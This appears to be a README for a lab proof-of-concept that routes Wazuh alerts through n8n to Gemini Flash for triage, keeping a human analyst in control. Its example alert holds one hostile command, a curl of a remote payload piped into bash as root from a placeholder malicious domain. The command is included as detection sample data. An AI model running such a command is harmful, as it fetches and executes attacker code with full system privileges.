# wazuh-n8n-ai-triage

# AI-Powered Wazuh Alert Triage  
LLM-Augmented SOC Automation using Wazuh + n8n + Gemini Flash

---

## Overview

This project implements an AI-driven alert triage pipeline that integrates:

- **Wazuh Manager + Indexer (OpenSearch)**
- **n8n workflow automation**
- **Google Gemini Flash (LLM)**


<img width="902" height="412" alt="Screenshot 2026-02-28 130319" src="https://github.com/user-attachments/assets/94488bd5-d8e6-4b94-aa62-ea8623eaefb6" />

The system retrieves recent security alerts from Wazuh, aggregates and filters them intelligently, and sends structured context to an AI triage agent.

The AI does not investigate or remediate.  
Its sole purpose is to classify alerts and recommend next steps, reducing alert fatigue while minimizing the risk of missing real threats.

---

## Problem Statement

Security Operations Centers (SOCs) face:

- High alert volume  
- Repetitive noise  
- Analyst fatigue  
- Inconsistent triage quality  

This project demonstrates how LLMs can normalize alert context, provide consistent reasoning, and classify alerts into actionable categories without removing human oversight.

---

## Architecture

### Stack

- Wazuh Manager + Indexer (OpenSearch)
- n8n (workflow automation)
- Gemini Flash (LLM)
- Docker-based lab deployment
- Internal Docker network (`soc-net`)
- Basic authentication between n8n and Wazuh

---

## End-to-End Flow

1. Analyst sends a triage request via n8n chat trigger  
2. n8n queries the Wazuh Indexer `_search` API  
3. Alerts are filtered by time range and severity  
4. Noise (CVE/vulnerability alerts) is excluded  
5. Alerts are aggregated by endpoint, rule description, and key fields  
6. Aggregated context is passed to Gemini Flash  
7. AI classifies alerts and recommends next steps  
8. Results are returned to the analyst  

---

## Severity Mapping

| Wazuh rule.level | Severity |
|------------------|----------|
| 1–3              | Low      |
| 4–7              | Medium   |
| 8–10             | High     |

---

## AI Triage Logic

The AI agent acts strictly as a **triage assistant**, not an investigator or responder.

### Classification Categories

- **Benign / Noise** – Normal operational behavior  
- **Suspicious – Needs Review** – Ambiguous or unusual activity  
- **Likely Malicious – Escalate** – Clear indicators of harmful behavior  

### Output Format

```
Alert Classification: [Benign | Suspicious | Likely Malicious]
Confidence: [Low | Medium | High]

Summary:
Brief explanation.

Key Factors:
- Most relevant observations
- Why they matter

Recommended Action:
[Close | Review | Escalate]
```

---

## Example Raw Wazuh Alert (Redacted)

```json
{
  "@timestamp": "2026-02-01T18:12:43Z",
  "agent": { "name": "linux-host-01" },
  "rule": {
    "level": 9,
    "description": "Suspicious command execution"
  },
  "data": {
    "command": "curl http://malicious-domain.com/payload.sh | bash",
    "dstuser": "root"
  }
}
```

---

## Example AI Output

```
Alert Classification: Likely Malicious
Confidence: High

Summary:
The alert indicates execution of a remote script piped directly into bash as root.

Key Factors:
- Remote script execution
- Privileged user context
- High severity alert level

Recommended Action:
Escalate
```

---

## Security Considerations

- Internal Docker network communication
- Basic authentication
- Credentials stored securely in n8n
- No hardcoded secrets
- Read-only access recommended for Wazuh queries

---

## Limitations

- Dependent on alert context quality
- Aggregation may hide granular event detail
- No automatic remediation or enrichment
- LLM confidence depends on available data

---

## SOC Alignment

- Supports **Detection & Analysis** phase of NIST 800-61
- Designed to reduce Tier 1 analyst workload
- Improves triage consistency and speed

---

## Future Enhancements

### Tier 1
- Known-benign allowlists
- Deduplication logic
- High-severity-only triage mode

### Tier 2
- MITRE ATT&CK mapping
- Threat intelligence enrichment
- Slack or ticketing integration

### Tier 3
- Analyst feedback loop
- Model performance evaluation
- Multi-model validation

---

## Educational Purpose

This project is a lab-based proof-of-concept demonstrating how LLMs can assist SOC alert triage while maintaining human oversight.
